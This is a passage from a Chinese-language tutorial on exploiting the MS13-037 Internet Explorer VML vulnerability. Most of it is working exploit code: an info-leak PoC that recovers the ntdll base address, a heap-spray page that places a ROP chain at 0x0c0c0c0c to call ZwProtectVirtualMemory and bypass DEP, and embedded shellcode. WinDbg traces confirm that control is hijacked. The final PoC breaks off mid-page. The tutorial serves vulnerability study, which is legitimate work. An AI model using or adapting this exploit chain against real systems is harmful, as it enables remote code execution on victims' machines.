&nbsp;&nbsp;&nbsp;&nbsp;vml1.dashstyle.array.item(6)&nbsp;=&nbsp;0x0c0c0c0c;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">先来看看实现信息泄露的poc代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&lt;html&gt;
&nbsp;&lt;head&gt;
&lt;meta&nbsp;http-equiv=&quot;x-ua-compatible&quot;&nbsp;content=&quot;IE=EmulateIE9&quot;&nbsp;&gt;
&lt;/head&gt;
&lt;title&gt;
ms13_037
&lt;/title&gt;
&lt;!--&nbsp;Include&nbsp;the&nbsp;VML&nbsp;behavior&nbsp;--&gt;
&lt;style&gt;v\:&nbsp;*&nbsp;{&nbsp;behavior:url(#default#VML);&nbsp;display:inline-block&nbsp;}&lt;/style&gt;
&lt;!--&nbsp;Declare&nbsp;the&nbsp;VML&nbsp;namespace&nbsp;--&gt;
&lt;xml:namespace&nbsp;ns=&quot;urn:schemas-microsoft-com:vml&quot;&nbsp;prefix=&quot;v&quot;&nbsp;/&gt;
&lt;script&gt;
var&nbsp;rect_array&nbsp;=&nbsp;new&nbsp;Array()
var&nbsp;a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;new&nbsp;Array()
function&nbsp;createRects(){
&nbsp;for(var&nbsp;i=0;&nbsp;i&lt;0x400;&nbsp;i++){
&nbsp;rect_array[i]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;document.createElement(&quot;v:shape&quot;)
&nbsp;rect_array[i].id&nbsp;=&nbsp;&quot;rect&quot;&nbsp;+&nbsp;i.toString()
&nbsp;document.body.appendChild(rect_array[i])
&nbsp;}
}
function&nbsp;getNtdllBase(){
&nbsp;var&nbsp;vml1&nbsp;&nbsp;=&nbsp;document.getElementById(&quot;vml1&quot;)
&nbsp;var&nbsp;shape&nbsp;=&nbsp;document.getElementById(&quot;shape&quot;)
&nbsp;for&nbsp;(var&nbsp;i=0;&nbsp;i&lt;0x400;&nbsp;i++){&nbsp;&nbsp;&nbsp;&nbsp;//set&nbsp;up&nbsp;the&nbsp;heap
a[i]&nbsp;=&nbsp;document.getElementById(&quot;rect&quot;&nbsp;+&nbsp;i.toString())._vgRuntimeStyle;
&nbsp;}
&nbsp;for&nbsp;(var&nbsp;i=0;&nbsp;i&lt;0x400;&nbsp;i++){
a[i].rotation;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//create&nbsp;a&nbsp;COARuntimeStyle
if&nbsp;(i&nbsp;==&nbsp;0x300)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//allocate&nbsp;an&nbsp;ORG&nbsp;array&nbsp;of&nbsp;size&nbsp;B0h
vml1.dashstyle&nbsp;=&nbsp;&quot;1&nbsp;2&nbsp;3&nbsp;4&nbsp;5&nbsp;6&nbsp;7&nbsp;8&nbsp;9&nbsp;10&nbsp;11&nbsp;12&nbsp;13&nbsp;14&nbsp;15&nbsp;16&nbsp;17&nbsp;18&nbsp;19&nbsp;20&nbsp;21&nbsp;22&nbsp;23&nbsp;24&nbsp;25&nbsp;26&nbsp;27&nbsp;28&nbsp;29&nbsp;30&nbsp;31&nbsp;32&nbsp;33&nbsp;34&nbsp;35&nbsp;36&nbsp;37&nbsp;38&nbsp;39&nbsp;40&nbsp;41&nbsp;42&nbsp;43&nbsp;44&quot;
&nbsp;&nbsp;}
&nbsp;}
&nbsp;var&nbsp;length_orig&nbsp;=&nbsp;vml1.dashstyle.array.length;
vml1.dashstyle.array.length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0&nbsp;-&nbsp;1;
for&nbsp;(var&nbsp;i=0;&nbsp;i&lt;0x400;&nbsp;i++)&nbsp;{
a[i].marginLeft&nbsp;&nbsp;&nbsp;=&nbsp;&quot;a&quot;;
marginLeftAddress&nbsp;=&nbsp;vml1.dashstyle.array.item(0x2E+0x16);
if&nbsp;(marginLeftAddress&nbsp;&gt;&nbsp;0)&nbsp;{
&nbsp;vml1.dashstyle.array.item(0x2E+0x16)&nbsp;=&nbsp;0x7ffe0300;
&nbsp;var&nbsp;leak&nbsp;=&nbsp;a[i].marginLeft;
&nbsp;vml1.dashstyle.array.item(0x2E+0x16)&nbsp;=&nbsp;marginLeftAddress;
&nbsp;vml1.dashstyle.array.length&nbsp;=&nbsp;length_orig;
&nbsp;ntdll_base=parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),&nbsp;16&nbsp;)&nbsp;-&nbsp;290992;
&nbsp;(ntdll_base.toString(16));
&nbsp;break;
&nbsp;}
&nbsp;}
&nbsp;return&nbsp;ntdll_base;
}
&lt;/script&gt;
&lt;body&nbsp;onload=&quot;createRects();&quot;&gt;
&lt;v:oval&gt;
&lt;v:stroke&nbsp;id=&quot;vml1&quot;/&gt;
&lt;/v:oval&gt;
&lt;v:oval&gt;
&lt;v:stroke&nbsp;dashstyle=&quot;2&nbsp;2&nbsp;2&nbsp;0&nbsp;2&nbsp;2&nbsp;2&nbsp;0&quot;&nbsp;id=&quot;shape&quot;/&gt;
&lt;/v:oval&gt;
&lt;input&nbsp;value=&quot;GetNtdllBaseAddr&quot;type=&quot;button&quot;&nbsp;onclick=&quot;getNtdllBase();&quot;&gt;&lt;/input&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">和先前说的一样，<strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);">先</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);"><strong>通过vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300将marginLeft属性值的地址设为0x7ffe0300，</strong></span></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">再通过读取marginLeft属性值获取 0x7ffe0300处四字节数据，减去0x470b0（即290992,同时dll版本不同偏移也不一样）得到ntdll的基地址</span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">，来看看效果：</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t01e7983015a9ceb5f7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到我们的信息泄露时成功的，我们再从调试器的角度来验证下这个计算公式是否正确。附加进程断下后，查看0x7ffe0300处的数据：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:015&gt;&nbsp;dd&nbsp;0x7ffe0300
7ffe0300&nbsp;&nbsp;775e70b0&nbsp;775e70b4&nbsp;00000000&nbsp;00000000
7ffe0310&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
7ffe0320&nbsp;&nbsp;0006330e&nbsp;00000000&nbsp;00000000&nbsp;00000000
7ffe0330&nbsp;&nbsp;cffa5133&nbsp;00000000&nbsp;00000dd0&nbsp;00000000
7ffe0340&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
7ffe0350&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
7ffe0360&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
7ffe0370&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000</pre><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);">0x775e70b0－0x470b0 = 0x775a0000</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">等于模块基地址，说明成功。现在我们已经得到了ntdll模块基地址于是我们就能构造我们的rop链了。下面我们将使用先前得到的模块基地址构造rop链之后再用”精准的堆喷射”技术将rop 链精准的布置到0x0c0c0c0c处。由于先前已经介绍了获取基地址的方式，这里直接定义基地址的值以减少篇幅。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">喷射代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&lt;html&gt;
&nbsp;&lt;head&gt;
&lt;script&gt;
function&nbsp;getRealAddr(base&nbsp;,offect){
&nbsp;var&nbsp;real_addr&nbsp;=&nbsp;base&nbsp;+&nbsp;offect;
&nbsp;var&nbsp;str&nbsp;=&nbsp;real_addr.toString(16);
&nbsp;var&nbsp;s1&nbsp;=&nbsp;str.substring(0,4);
&nbsp;var&nbsp;s2&nbsp;=&nbsp;str.substring(4,8);
&nbsp;return&nbsp;&quot;%u&quot;&nbsp;+&nbsp;s2&nbsp;+&nbsp;&quot;%u&quot;&nbsp;+&nbsp;s1
}
var&nbsp;ntdll_base&nbsp;=&nbsp;0x775a0000;
stack_pivot&nbsp;=&nbsp;getRealAddr(ntdll_base,0x0001578a);//#&nbsp;ret&nbsp;#&nbsp;from&nbsp;ntdll
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x000096c9);//#&nbsp;pop&nbsp;ebx&nbsp;#&nbsp;ret&nbsp;#&nbsp;from&nbsp;ntdll
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x00015789);//&nbsp;#&nbsp;xchg&nbsp;eax,&nbsp;esp&nbsp;#&nbsp;ret&nbsp;from&nbsp;ntdll
ntdll_rop&nbsp;=&nbsp;getRealAddr(ntdll_base&nbsp;,0x45F18);//#&nbsp;ntdll!ZwProtectVirtualMemory
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%uffff%uffff&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c34%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c38%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c3c%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0400%u0000&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u4141%u4141&quot;;
rop_chains&nbsp;=&nbsp;unescape(stack_pivot&nbsp;+&nbsp;ntdll_rop);
//heapspray&nbsp;&nbsp;
&nbsp;//&nbsp;[&nbsp;Shellcode&nbsp;]
var&nbsp;shellcode&nbsp;=&nbsp;unescape(
&quot;%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30&quot;&nbsp;+
&quot;%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031&quot;&nbsp;+
&quot;%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752&quot;&nbsp;+
&quot;%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a&quot;&nbsp;+
&quot;%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34&quot;&nbsp;+
&quot;%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475&quot;&nbsp;+
&quot;%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66&quot;&nbsp;+
&quot;%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424&quot;&nbsp;+
&quot;%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86&quot;&nbsp;+
&quot;%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff&quot;&nbsp;+
&quot;%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c&quot;&nbsp;+
&quot;%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5&quot;&nbsp;+
&quot;%u6c61%u2e63%u7865%u0065&quot;);
&nbsp;var&nbsp;fill&nbsp;=&nbsp;unescape(&quot;%u0c0c%u0c0c&quot;);
&nbsp;while&nbsp;(fill.length&nbsp;&lt;&nbsp;0x1000){
&nbsp;fill&nbsp;+=&nbsp;fill;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;padding&nbsp;offset&nbsp;]
&nbsp;padding&nbsp;=&nbsp;fill.substring(0,&nbsp;0x5F6);
&nbsp;//&nbsp;[&nbsp;fill&nbsp;each&nbsp;chunk&nbsp;with&nbsp;0x1000&nbsp;bytes&nbsp;]
&nbsp;evilcode&nbsp;=&nbsp;padding&nbsp;+&nbsp;rop_chains&nbsp;+&nbsp;shellcode&nbsp;+&nbsp;fill.substring(0,&nbsp;0x800&nbsp;-&nbsp;padding.length&nbsp;-&nbsp;rop_chains.length&nbsp;-&nbsp;shellcode.length);
&nbsp;//&nbsp;[&nbsp;repeat&nbsp;the&nbsp;block&nbsp;to&nbsp;512KB&nbsp;]
&nbsp;while&nbsp;(evilcode.length&nbsp;&lt;&nbsp;0x40000){
&nbsp;evilcode&nbsp;+=&nbsp;evilcode;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21)&nbsp;-&nbsp;XP&nbsp;SP3&nbsp;+&nbsp;IE8&nbsp;]
&nbsp;var&nbsp;block&nbsp;=&nbsp;evilcode.substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21);
&nbsp;//&nbsp;[&nbsp;Allocate&nbsp;200&nbsp;MB&nbsp;]
&nbsp;var&nbsp;slide&nbsp;=&nbsp;new&nbsp;Array();
&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;400;&nbsp;i++){
&nbsp;slide[i]&nbsp;=&nbsp;block.substring(0,&nbsp;block.length);
&nbsp;}
&nbsp;(&quot;heapspray&nbsp;done&quot;);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">效果：</span></p><p style="text-indent: 2em; text-align: center;"><img src="http://p8.qhimg.com/t010b8e2f757141f64f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对比脚本代码，我们知道堆喷射也成功了。位于0x0c0c0c0c地址处的数据恰好是rop的开头。前面代码的rop链构造的有些奇怪，和我开头所说的有点不同，它在xchg指令之前还有一些指令，这是为什么呢? 其实这是根据漏洞实际情况来构造的。我们看看劫持程序时的一个情景：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:014&gt;&nbsp;g
(430.99c):&nbsp;Access&nbsp;violation&nbsp;-&nbsp;code&nbsp;c0000005&nbsp;(first&nbsp;chance)
First&nbsp;chance&nbsp;exceptions&nbsp;are&nbsp;reported&nbsp;before&nbsp;any&nbsp;exception&nbsp;handling.
This&nbsp;exception&nbsp;may&nbsp;be&nbsp;expected&nbsp;and&nbsp;handled.
eax=41414141&nbsp;ebx=1260773c&nbsp;ecx=12d0b010&nbsp;edx=00000c8d&nbsp;esi=12607750&nbsp;edi=12607738
eip=6ca5f20f&nbsp;esp=024eb5d0&nbsp;ebp=024eb608&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00010202
***&nbsp;ERROR:&nbsp;Symbol&nbsp;file&nbsp;could&nbsp;not&nbsp;be&nbsp;found.&nbsp;&nbsp;Defaulted&nbsp;to&nbsp;export&nbsp;symbols&nbsp;for&nbsp;C:\Windows\System32\mshtml.dll&nbsp;-&nbsp;
mshtml!Ordinal104+0x4ec70:
6ca5f20f&nbsp;ff5008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+8]&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:41414149=????????
0:005&gt;&nbsp;u
mshtml!Ordinal104+0x4ec70:
6ca5f20f&nbsp;ff5008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+8]
6ca5f212&nbsp;ebf7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mshtml!Ordinal104+0x4ec6c&nbsp;(6ca5f20b)
6ca5f214&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
6ca5f215&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
6ca5f216&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
6ca5f217&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
6ca5f218&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
6ca5f219&nbsp;8b425c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[edx+5Ch]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这里的eax的值就是通过<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);"><strong>vml1.dashstyle.array.item(6) = 0x41414141</strong></span>设置的，设置成0x41414141的目的是为了便于分析劫持程序流程时的一些情况。可以看到eax的值就是我们设置的。程序最终会调用<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);"><strong>call &nbsp; &nbsp;dword ptr [eax+8] </strong></span>指令来实现虚函数调用。我们来将eax假定为 0x0c0c0c0c，对照着rop链来推理一波。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">rop链：
stack_pivot&nbsp;=&nbsp;getRealAddr(ntdll_base,0x0001578a);//#&nbsp;ret&nbsp;#&nbsp;from&nbsp;ntdll　　　　&lt;－－－－－－－－－0x0c0c0c0c
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x000096c9);//#&nbsp;pop&nbsp;ebx&nbsp;#&nbsp;ret&nbsp;#&nbsp;from&nbsp;ntdll
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x00015789);//&nbsp;#&nbsp;xchg&nbsp;eax,&nbsp;esp&nbsp;#&nbsp;ret&nbsp;from&nbsp;ntdll
ntdll_rop&nbsp;=&nbsp;getRealAddr(ntdll_base&nbsp;,0x45F18);//#&nbsp;ntdll!ZwProtectVirtualMemory
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;//#&nbsp;ret&nbsp;to&nbsp;shellcode
ntdll_rop&nbsp;+=&nbsp;&quot;%uffff%uffff&quot;;//
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c34%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c38%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c3c%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0400%u0000&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u4141%u4141&quot;;
rop_chains&nbsp;=&nbsp;unescape(stack_pivot&nbsp;+&nbsp;ntdll_rop);</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">eax=0x0c0c0c0c 那么call &nbsp; &nbsp;dword ptr [eax+8] 程序就会去执行　# xchg eax, esp # ret 　，　xchg eax,esp后,esp指向了0x0c0c0c0c，再来一个ret ，,就会跳转到另一个ret指令，然后进入下一条rop指令，# pop ebx # ret ，这样一个pop就将我们刚才执行过的xchg指令绕过了。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">再来一个ret，我们就会跳转到ntdll!ZwProtectVirtualMemory函数，执行，函数的参数已经布置好了。函数执行完毕时，我们的shellcode所在的内存区域就会被设置为可执行，并会跳转到shellcode这样就绕过了DEP。我们来实际调试下这样的一段rop指令。改怎么调试呢？我们可以在0x0c0c0c14处下 硬件读取断点。因为位于0x0c0c0c14处的值就是xchg指令的地址，一般而言这种ie的rop链第一步就是使用类似于 xchg指令来把堆伪造成栈。所以我们在这下断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里使用的poc(同样为了简便，将没有使用信息泄露，直接硬编码了ntdll模块基地址，这个需要修改）:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function&nbsp;getRealAddr(base&nbsp;,offect){
&nbsp;var&nbsp;real_addr&nbsp;=&nbsp;base&nbsp;+&nbsp;offect;
&nbsp;var&nbsp;str&nbsp;=&nbsp;real_addr.toString(16);
&nbsp;var&nbsp;s1&nbsp;=&nbsp;str.substring(0,4);
&nbsp;var&nbsp;s2&nbsp;=&nbsp;str.substring(4,8);
&nbsp;return&nbsp;&quot;%u&quot;&nbsp;+&nbsp;s2&nbsp;+&nbsp;&quot;%u&quot;&nbsp;+&nbsp;s1
}
var&nbsp;ntdll_base&nbsp;=&nbsp;0x775a0000;
stack_pivot&nbsp;=&nbsp;getRealAddr(ntdll_base,0x0001578a);
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x000096c9);
stack_pivot&nbsp;+=&nbsp;getRealAddr(ntdll_base,0x00015789);
ntdll_rop&nbsp;=&nbsp;getRealAddr(ntdll_base&nbsp;,0x45F18);
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%uffff%uffff&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c34%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c38%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c3c%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0c40%u0c0c&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u0400%u0000&quot;;
ntdll_rop&nbsp;+=&nbsp;&quot;%u4141%u4141&quot;;
rop_chains&nbsp;=&nbsp;unescape(stack_pivot&nbsp;+&nbsp;ntdll_rop);
//heapspray&nbsp;&nbsp;
&nbsp;//&nbsp;[&nbsp;Shellcode&nbsp;]
var&nbsp;shellcode&nbsp;=&nbsp;unescape(
&quot;%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30&quot;&nbsp;+
&quot;%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031&quot;&nbsp;+
&quot;%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752&quot;&nbsp;+
&quot;%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a&quot;&nbsp;+
&quot;%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34&quot;&nbsp;+
&quot;%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475&quot;&nbsp;+
&quot;%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66&quot;&nbsp;+
&quot;%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424&quot;&nbsp;+
&quot;%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86&quot;&nbsp;+
&quot;%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff&quot;&nbsp;+
&quot;%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c&quot;&nbsp;+
&quot;%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5&quot;&nbsp;+
&quot;%u6c61%u2e63%u7865%u0065&quot;);
&nbsp;var&nbsp;fill&nbsp;=&nbsp;unescape(&quot;%u0c0c%u0c0c&quot;);
&nbsp;while&nbsp;(fill.length&nbsp;&lt;&nbsp;0x1000){
&nbsp;fill&nbsp;+=&nbsp;fill;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;padding&nbsp;offset&nbsp;]
&nbsp;padding&nbsp;=&nbsp;fill.substring(0,&nbsp;0x5F6);
&nbsp;//&nbsp;[&nbsp;fill&nbsp;each&nbsp;chunk&nbsp;with&nbsp;0x1000&nbsp;bytes&nbsp;]
&nbsp;evilcode&nbsp;=&nbsp;padding&nbsp;+&nbsp;rop_chains&nbsp;+&nbsp;shellcode&nbsp;+&nbsp;fill.substring(0,&nbsp;0x800&nbsp;-&nbsp;padding.length&nbsp;-&nbsp;rop_chains.length&nbsp;-&nbsp;shellcode.length);
&nbsp;//&nbsp;[&nbsp;repeat&nbsp;the&nbsp;block&nbsp;to&nbsp;512KB&nbsp;]
&nbsp;while&nbsp;(evilcode.length&nbsp;&lt;&nbsp;0x40000){
&nbsp;evilcode&nbsp;+=&nbsp;evilcode;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21)&nbsp;-&nbsp;XP&nbsp;SP3&nbsp;+&nbsp;IE8&nbsp;]
&nbsp;var&nbsp;block&nbsp;=&nbsp;evilcode.substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21);
&nbsp;//&nbsp;[&nbsp;Allocate&nbsp;200&nbsp;MB&nbsp;]
&nbsp;var&nbsp;slide&nbsp;=&nbsp;new&nbsp;Array();
&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;400;&nbsp;i++){
&nbsp;slide[i]&nbsp;=&nbsp;block.substring(0,&nbsp;block.length);
&nbsp;}
&nbsp;(&quot;heapspray&nbsp;done&quot;);
&lt;/script&gt;
&lt;meta&nbsp;http-equiv=&quot;x-ua-compatible&quot;&nbsp;content=&quot;IE=EmulateIE9&quot;&nbsp;&gt;
&lt;/head&gt;
&lt;title&gt;
&lt;/title&gt;
&lt;style&gt;v\:&nbsp;*&nbsp;{&nbsp;behavior:url(#default#VML);&nbsp;display:inline-block&nbsp;}&lt;/style&gt;
